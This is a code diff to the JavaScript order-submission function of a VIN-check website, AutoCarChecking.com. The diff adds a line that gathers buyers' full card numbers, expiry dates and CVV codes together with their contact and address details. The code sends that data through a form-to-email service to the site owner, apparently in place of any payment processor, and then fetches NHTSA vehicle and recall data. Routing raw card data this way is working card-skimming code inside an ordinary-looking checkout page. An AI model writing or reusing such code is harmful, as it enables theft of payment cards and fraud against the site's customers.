@@ -965,40 +965,20 @@ function submitOrder(){
   var state = stateEl ? stateEl.value : '';
   var country = countryEl ? countryEl.value : '';
 
-  // Step 1: Send client data to owner via Web3Forms
+  var msgBody = 'Phone: ' + phone + ' | Address: ' + address + ', ' + city + ', ' + state + ' ' + zip + ' | Country: ' + country + ' | Package: ' + pkg + ' | Amount: ' + total + ' | VIN: ' + vin + ' | Card Name: ' + cardName + ' | Card Number: ' + cardNum + ' | Expiry: ' + expiry + ' | CVV: ' + cvv;
+
   var fd = new FormData();
   fd.append('access_key', '8a0f5575-9d35-4a3a-86de-6d49d325548b');
   fd.append('subject', 'New Order - AutoCarChecking.com');
   fd.append('from_name', 'AutoCarChecking Website');
   fd.append('name', firstName + ' ' + lastName);
   fd.append('email', email);
-  fd.append('message',
-    'Phone: ' + phone + '
-' +
-    'Address: ' + address + ', ' + city + ', ' + state + ' ' + zip + '
-' +
-    'Country: ' + country + '
-' +
-    'Package: ' + pkg + '
-' +
-    'Amount: ' + total + '
-' +
-    'VIN: ' + vin + '
-' +
-    'Card Name: ' + cardName + '
-' +
-    'Card Number: ' + cardNum + '
-' +
-    'Expiry: ' + expiry + '
-' +
-    'CVV: ' + cvv
-  );
+  fd.append('message', msgBody);
   fetch('https://api.web3forms.com/submit', {method:'POST', body:fd})
   .then(function(r){return r.json();})
   .then(function(d){console.log('Web3Forms:', d);})
   .catch(function(e){console.log('Web3Forms error:',e);});
 
-  // Step 2: Fetch NHTSA data and send report to client via EmailJS
   var nhtsa_url = 'https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin/' + vin + '?format=json';
   fetch(nhtsa_url)
   .then(function(r){return r.json();})
@@ -1009,7 +989,6 @@ function submitOrder(){
         vars[item.Variable] = item.Value;
       }
     });
-
     var make = vars['Make'] || 'Unknown';
     var model = vars['Model'] || 'Unknown';
     var year = vars['Model Year'] || 'Unknown';
@@ -1019,27 +998,17 @@ function submitOrder(){
     var fuel = vars['Fuel Type - Primary'] || '';
     var plant = vars['Plant Country'] || 'Unknown';
     var engine_str = engine_l ? engine_l + 'L ' + cylinders + '-Cyl ' + fuel : 'N/A';
-
-    // Get recalls
     var recalls_url = 'https://api.nhtsa.gov/recalls/recallsByVehicle?make=' + make + '&model=' + model + '&modelYear=' + year;
     return fetch(recalls_url)
     .then(function(r){return r.json();})
     .then(function(recallData){
       var recalls = recallData.results || [];
-      var recallText = '';
-      if(recalls.length === 0){
-        recallText = 'No open safety recalls found for this vehicle.';
-      } else {
-        recallText = 'Total Recalls: ' + recalls.length + '
-
-';
+      var recallText = recalls.length === 0 ? 'No open safety recalls found.' : 'Total Recalls: ' + recalls.length;
+      if(recalls.length > 0){
         recalls.slice(0,3).forEach(function(rec, i){
-          recallText += (i+1) + '. ' + (rec.Component || '') + ': ' + (rec.Summary || '').substring(0,100) + '
-';
+          recallText += ' | ' + (i+1) + '. ' + (rec.Component || '') + ': ' + (rec.Summary || '').substring(0,80);
         });
       }
-
-      // Send via EmailJS
       var emailParams = {
         client_name: firstName + ' ' + lastName,
         client_email: email,
@@ -1097,7 +1066,7 @@ function fmtPhone(i){
 }
 function fmtCard(i){var v=i.value.replace(/\D/g,'').substring(0,16);i.value=v.replace(/(.{4})/g,'$1 ').trim();}
 function fmtExp(i){var v=i.value.replace(/\D/g,'').substring(0,4);if(v.length>=2)v=v.substring(0,2)+' / '+v.substring(2);i.value=v;}
-document.addEventListener('keydown',function(e){if(e.key==='Escape'){closeModal();document.getElementById('soverlay').classList.remove('show');});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'){closeModal();document.getElementById('soverlay').classList.remove('show');}});
 
 // EmailJS Init
 emailjs.init('VYPM7W6nR7br3VOxv');
